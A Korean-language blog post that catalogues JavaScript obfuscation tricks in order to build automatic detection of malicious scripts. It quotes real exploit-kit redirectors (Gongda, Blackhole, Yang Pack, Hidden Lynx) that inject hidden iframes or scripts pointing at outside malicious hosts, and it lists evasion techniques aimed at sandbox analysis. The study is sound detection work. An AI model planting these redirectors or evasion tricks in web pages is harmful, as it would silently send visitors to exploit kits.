---
layout: post
title: "JavaScript Obfuscation Patterns"
date: 2013-06-01 14:14
comments: true
categories: 
---

정리하는 목적은 Malicious JavaScript 을 자동으로 판정하기 위함.

그러기 위해서, 악성 자바스크립트에서 쓰는 syntax pattern 을 정리하고, 자동으로 패턴을 찾아내는 것을
만들려고 함.

지금 생각하는 수순은

1. 단순한 regexp 스트링 매칭
2. HTML Parsing 
3. JavaScript Parsing -> Abstract Syntax Tree 를 빌드해서, visit 하면서, 패턴을 분석
4. JavaScript Runtime 을 돌려서 동적으로 생성되는 Symbol table 이나 
Assignment , String mainpulation 을 분석

그리고 Drive-by-download 공격의 redirection 의 단계마다 JavaScript Obfuscation 의 패턴이 조금씩 달라지기 때문에. 
이 점도 고려할 필요가 있음.

1. 랜딩페이지에는 주로 다음 단계로 redirection 하는 코드들이 들어있다. 

중국의 Hidden Lynx 가 수행했다고 의심되는 작전에서 사용된 redirection code

    document.write('<script 
    src="http://www.*******curling.com/Docs/BW06/iframe.js"></script>');

Gongda pack 으로 traffic 을 돌리기 위해 사용된 redirection code

    eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};
    if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];
    e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}
    return p}('d(3.7.c(\'4=\')==-1){e 2=f h();2.g(2.i()+b*5*5*8);3.7=\'4=9;a=/;2=\'+2.j();
    3.p("<6 s=r://u.w/v/t/q/l.k m=n o=0></6>")}',33,33,
    '||expires|document|hsblm|60|iframe|cookie|1000|Yes|path|12|indexOf|if|var|new|setTime|Date|getTime|
    toGMTString|html|ye|width|100|height|write|pop|http|src|goods|dangguro|upload|com'.split('|'),0,{}))

난독화를 해제하면,

    if (document.cookie.indexOf('hsblm=') == -1) {
        var expires = new Date();
        expires.setTime(expires.getTime() + 12 * 60 * 60 * 1000);
        document.cookie = 'hsblm=Yes;path=/;expires=' + expires.toGMTString();
        document.write("<iframe src=http://dangguro.com/upload/goods/pop/ye.html width=100 height=0></iframe>")
    }

redirection 을 하기 위해서 들어가는 코드들은 

* 간결하고,
* document.write() 로 iframe or script tag 를 뱉어내거나
* createElement() 로 script / iframe tag 을 집어 넣는다.

2. 다음 단계에서는, 주로 php 가 돌면서 browser fingerprinting 을 하고 적절한 exploit 을 보내준다.
1 번과 2 번에 들어가는 악성 JavaScript 은 성격이나 패턴이 조금 다르다는 점도 염두에 두려 한다.

## Patterns

### Execution

난독화된 코드를 수행시키는 방법으로는, `eval()` `setTimeout()` `setInterval()` 등이 사용된다.

### Function redefinition

eval(), unescape(), fromCharCode(), replace(), ActiveXObject() 등의 수상한 함수들을 감추기 위해 사용한다.

    > var e=eval;
    > var a=1;
    > e("a=a+1");
    2
    >

IDS, IPS, AV 의 패턴 패칭을 우회하기 위해 사용된다.

### document["w"+"r"+"ite"]

JavaScript 에서는 method 도 결국 property 에 불과하기때문에, function 을 document["write"] 로 부를 수 있다.
여기서 좀 더 꼬면 document["w"+"r"+"ite"]

DOM 환경이 아니라서, document.write() 라는 함수를 정의해서 테스트한다.

    > document = { write: function(str) { console.log(str); } }
    { write: [Function] }
    > document.write('hi')
    hi
    > document["w"+"r"+"ite"]('hi')
    hi
    >

아니면 "write" 를 변수에 담아서 호출할수도 있다.

    > document = { write: function() { console.log("hi"); } }
    { write: [Function] }
    > document.write()
    hi
    > a = "w"+"r"+"i"+"t"+"e";
    'write'
    > document[a]();
    hi
    >

주로 `document.write()` `document.writeln()` `this.eval()` `window.eval()` 등에 사용한다.
브라우저에서 JavaScript Global Scope 에서는 this === window 이기 때문에,
, `this.eval()` === `window.eval()`

### Funciton redefinition 2

node 에서 돌려보자.

node 환경이라서 기본적인 DOM 오브젝이 없다. 대강 window.eval() 을 만들어준다.

    > window = { eval: function() { console.log('eval') } }
    { eval: [Function] }
    > window.eval()
    eval
    > v = "va"+"l"
    'val'
    > window[""+"e"+v]()
    eval
    >

즉 function redefinition 패턴 + document["w"+"r"+"ite"] 패턴을 결합하여

    v = "va"+"l"
    e = window[""+"e"+v]

`eval()` 함수를 `e()` 로 은밀하게 옮겼다. 앞으로 `e()` 를 `eval()` 대신 사용할 수 있다.

### Function redefinition 3

    b={v:{q:{x:this}}}.v.q.x;
    qq='ghej4vabl'
    q=qq[2]+qq[5]+qq[6]
    q=q+qq[8]
    w={v:b[q]}.v

`w=eval()` 펑션이 들어가게 된다. `w=this["eval"]` 로 만들어지는 것이 포인트.

이런 패턴을 detect 하려면 방법은 2 가지가 있을 것 같은데.

1. JavaScript runtime 을 붙여서 돌리는 것.
2. JavaScript Parser 로 AST 를 빌드하고, 변수의 값을 계산해내는 것. (컴파일러 최적화와 유사. Terminal 노드까지 계산이 가능하다면.)

### replace()

'OB3S3FUCA!TED!'.replace() 을 통해 난독화된 스트링을 풀어서 사용하는 패턴.

    > var a;
    > eval('a=un2scap2'.replace(/2/g,'e'));
    [Function: unescape]
    > var str = escape("BABO?!@")
    > a(str)
    'BABO?!@'
    >

a() 로 unescape() 된다.

Function redefinition 을 그냥 하는 것이 아니라, replace() 를 통해서 스트링을 한번 푼다음에, eval() 로 하였다.

### split()

스트링을 split() 해서 list 를 만든다. 보통 byte list 을 만드는데.
split() 해서 list 를 만들고, 이 리스트를 Math.sin() 등의 다양한 함수로 가공한 후에, fromCharCode() 로
스트링으로 복원해서 사용한다. eval() 을 한다던지... Shellcode 로 쓴다던지.

    > n="19~50~57~48".split("a~".substr(1));
    [ '19', '50', '57', '48' ]

split() 하는 delimeter 를 숨기기 위해 "a~".substr(1) 을 사용하였다.

### unescape()

%XX%YY 형태로 인코딩 된 녀석을 스트링으로 복원한다.

### fromCharCode()

    > String.fromCharCode(104,0164,0164,112,0x3a,0x2f,0x2f,49,50,067,056,48,0x2e,48,46,49,072,0x38,060,070,060,47,47,112,0165,0x46,0x62,0x4a,111,0146,0124,0143,0172,0x43,89,82,0x75,65,111,81,47);
    'http://127.0.0.1:8080//puFbJofTczCYRuAoQ/'
    >

__스트링을 split() 해서 list 를 만들고 그 리스트에 Math.sin() 등을 이용한 연산을 돌린 후에,
String.fromCharCode() 로 다시 스트링으로 복원하여, 최후에 eval() 을 돌린다.__ 정도가 가능하다.

또 다른 예:

    $ cat x.js
    var i = 0;

    for(i=0;i<"iDMMNvNSME".length;i++) {
        console.log(String.fromCharCode("iDMMNvNSME".charCodeAt(i) ^ 0x21));
    }
    $ node x.js
    H
    e
    l
    l
    o
    W
    o
    r
    l
    d

"HelloWorld" 를 0x21 로 XOR 시켜서 저장해놓았다가, 다시 XOR 로 풀어서 `fromCharCode()` 로
캐릭터화했다.

### Script/Iframe injection

`document.write()` `document.writeln()` `createElement('script')` `createElement('iframe')` `createElement("object")` 을 
사용하여 동적으로 HTML tag 또는 JS 코드를 삽입/실행시키는 테크닉.

Yang Pack EK 의 Redirector 를 보자.

    <script type="text/javascript" src="http://js.xxx.com/2744552/tongji.js"></script><noscript>
    <a href="http://www.xxx.com"><img src="http://img.xxx.com/2744552/tongji.gif" /></noscript>

    <script language='JavaScript'>
    function booom1() { document.write("<iframe src='t.html' width='50' height='1'></iframe>");}
    ...

document.write() 로 iframe 을 삽입한다.

블랙홀 EK 에서 iframe 을 삽입하는 코드를 보자.

    if (document.getElementsByTagName('body')[0]){
        iframer();
    } else {
        document.write("<iframe src="http://[removed]/?go=2' width='10' height='10' style="visibility:hidden;position:absolute;left:0;top:0;'></iframe>");
    }
    function iframer() {
        var f = document.createElement('iframe');
        f.setAttribute('src', 'http://[removed]/?go=2');
        f.style.visibility = 'hidden';
        f.style.position = 'absolute';
        f.style.left = '0';
        f.style.top = '0';
        f.setAttribute('width', '10');
        f.setAttribute('height', '10');
        document.getElementsByTagName('body')[0].appendChild(f);
    }

createElement() 로 iframe 을 삽입한다.

### try { } catch(e) { }

    > Boolean().prototype.a
    TypeError: Cannot read property 'a' of undefined
        at repl:1:21
        at REPLServer.self.eval (repl.js:109:21)
        at Interface.<anonymous> (repl.js:248:12)
        at Interface.EventEmitter.emit (events.js:96:17)
        at Interface._onLine (readline.js:200:10)
        at Interface._line (readline.js:518:8)
        at Interface._ttyWrite (readline.js:736:14)
        at ReadStream.onkeypress (readline.js:97:10)
        at ReadStream.EventEmitter.emit (events.js:126:20)
        at emitKey (readline.js:1058:12)
    > try { console.log("1"); Boolean().prototype.a; console.log("2"); } catch(e) { console.log('babo'); }
    1
    babo
    >

try {} 에서 일부러 exception 을 발생시켜서, 수행 중간에 catch {} 로 control flow 를 넘긴다.
정확히 어떤 statement 가 exception 을 발생시키는지 모른다면, control flow 를 짐작할 수 없게 된다.
Control flow obfuscation 패턴.

### Base64 

HTML 의 몇몇 tag 들은 Base64 인코딩을 풀어서 쓸 수 있다. 
&lt;img> 를 따로 화일로 안만들고 &lt;img tag 에 base64 인코딩을 해서 HTML 화일 1 장에 다 넣을 수가 있는데,
이것을 이용하는 방법이 있다.
따로 decoding 루틴을 달 필요가 없기에, 간편하다.

### Radix Conversion 

    > -~'0x14f'[720094129.0.toString(2<<4)]
    6
    > -~'0x14f'[720094129.0.toString(2<<4)]
    6
    > 720094129.0.toString(2<<4)
    'length'
    > -~5
    6
    >

따라가보자.

`720094129.0.toString(2<<4)` 는 'length' 가 된다. toString(radix) 로 `2<<4` 는 32 니까, 32 진법으로 
720094129 를 변환하면 'length' 가 되는 셈이다. 32 진법에서는 [0-9a-v] 를 사용한다.

'0x14f'.length 가 되는 셈이고 결국 숫자 5 가 된다. JavaScript 에서 `~` 는 Bitwise NOT 으로 MSB 가 invert 되니
음수로 바뀌게 된다.

JavaScript 에서 

    -1 (base 10) = 1111 1111 1111 1111 1111 1111 1111 1111 (base2)

이다. ~0 은 -1 이 된다. -~ 하면 +1 하는 것과 같다.

function 을 redefine 하는 것으로 다시 가보면

    > window={eval:function(){console.log("eval");}}
    { eval: [Function] }

이제부터 난독화된 본코드

    > var x=490837.0.toString(2<<4);window[x]()
    eval
    >

32 진수로 변환해서 'eval' 이라는 스트링을 얻어냈다.
window.eval() 을 아주 힘들게 호출했다. 이 정도까지 가면, 패턴 검색정도로는 "eval" 이라는 스트링을 찾을 수 없다.

### Math

    > Math.log(Math.E)
    1

-2 가 필요하면 -2*Math.log(Math.E) 를 사용한다. 간단하지만, 수학울렁증이 있으면 멘탈이 흔들린다.

Math.PI 와 Math.sin() 등을 이용해 x = [ 125.5, 49.5, ... ] 등의 리스트를 가공한다음에 fromCharCode() 를 사용해서
스트링으로 원복하는 패턴.

다음에는 그냥 쓸데없이 다양한 radix base 의 숫자를 써서 수학 울렁증을 유발시키는 패턴.

    > if(020==0x10) console.log('babo')
    babo

귀찮게 020 == 0x10 등의 conditional 을 중간 중간에 넣어 헤깔리게 만든다.

### OnMouseMove 핸들러

    document.onmousemove = function() {
        ...
        var head = document.getElementsByTagName("head")[0]
        var script = document.createElement("script")
        script.type = "text/javascript"
        script.onreadystatechange = function() {
            if (this.readyState == "complete") window.handler_state = 2;
        }
        script.onload = function() { window.handler_state = 2; }
        script.src = url + "1x2.js"
        head.appendChild(script)
        ...
    }

VM 기반의 자동화된 동적 분석에 대항하기 위한 테크닉. 마우스가 움직이면 
&lt;script src="xxx.js"> 를 DOM 트리의 &lt;head> 밑에 밀어 넣는다.
자동화된 VM 분석에 대항하면서, Control flow 를 숨기는 패턴.

1. VMware / VirtualBox 를 통해 동적분석을 하려하거나, 
2. JavaScript runtime + DOM emulation 을 가지고 JavaScript 을 인터프리팅하는

자동화된 분석 도구를 피해가기 위한 목적이 크다.

### HTML <tag>

HTML tag 에 데이터를 숨기는 기법이다. &lt;iframe> redirection code 를 inject 할 때 자주 사용된다.

    <x id="babo" style="display:none">
    123456789
    </x>

    <script>
    var x= document.getElementById("babo");
    alert(x.innerHTML);
    </script>

&lt;x>...&lt;/x>  안에 인코딩된 스트링을 숨기고, &lt;script>&lt;/script> 블럭에서 디코딩을 해서,
&lt;iframe> 태그를 document.write 또는 createElement('iframe') 을 통해서 inject 한다.
JavaScript 블럭만 정적 분석을 해서는 발견하기가 어렵다.

### Silly Tricks

조금씩 비트는 수준의 테크닉들이 있다.

`a = { q:"string" }.q;` 는 `a="string"` 과 같다.

좀 더 비틀어보자.

`b={v:{q:{x:"string"}}}.v.q.x` 은 `b="string"` 과 같다.

    > a = {q:"string"}.q
    'string'
    > a
    'string'
    > b={v:{q:{x:"string"}}}.v.q.x
    'string'
    > b
    'string'
    >

이건 for loop 를 비트는 흔한 기술법. `for(i=0;i-3782<0;i++){...}` 는 `for(i=0;i<3782;i++){...}` 와 같다.
아니면 변수를 RHS 에 놓는다. `for(i=0;0>i-3782;i=-~i)`

    > for(i=0;0>i-5;i=-~i)console.log(i);
    0
    1
    2
    3
    4
    >


### Analysis

#### Static Approach

지금 생각에 Index of Coincidence, Consonant Ratio, Special Character Ratio 등은 큰 의미가 없을 것 같다.

가정과 질문들은

- Redirection 을 해주는 1 단계 페이지들과 감염을 시키는 2 단계 페이지들을 분석할 때 방법론이 다르다.
- 모든 악성 웹사이트의 HTML/JavaScript 이 난독화 되어있지는 않다. 담백하게 작성된 것도 적지 않다.
- VM 전단계에서 fast-filtering 을 목적으로 하는가 아니면, 특정부분은 VM 보다 나을 수 있는 Client Honeypot 시스템을 만드는가?


- 다음 각각은 특정한 용도가 있다.
<ol>
<li>CVE 중심으로 signature 를 찾는 것</li>
<li>HTML 정적 분석</li>
<li>JavaScript 정적 분석</li>
<li>JS 인터프리터와 DOM 에뮬레이터로 동적 분석하는 것</li>
<li>VM 기반의 동적 분석</li>
</ol>

그리고 메모.

- AST 를 파싱해서 loop construct 안에 다량의 스트링 concatenation 이 있는 패턴을 잡기 위한 룰
- for loop construct 하부 트리에 fromCharCode() 나 fromCharCode 의 clone 이 있는 패턴.
- &lt;tag id="xyz"> Encrypted Data &lt;tag> 와 같은 패턴을 잡기 위한 룰
- Misplaced &lt;iframe> & &lt;script>: &lt;html> 밖에 위치해 있거나, &lt;head> &lt;body> 의 밖에 위치한 태그들.
- 파싱해서 Tree 를 visit 하다가, MemberExpression 안에 BinaryExpression '+' 가 들어가 있으면 의심해볼 만하다. 정상적인 경우에는 `my_object["first_name"]` 이런 식으로 코딩하지, `my_object["first"+"_"+"name"]` 이렇게는 잘 안한다. String 을 [Function] 으로 변환하기 위해서는 String 이라던가 document 라던가 window 의 멤버 참조로 할 수 밖에 없기 때문에.

<pre>
> s=String;
[Function: String]
> f="f"+"r"+"omChar"
'fromChar'
> s[f+"Code"]
[Function: fromCharCode]
</pre>
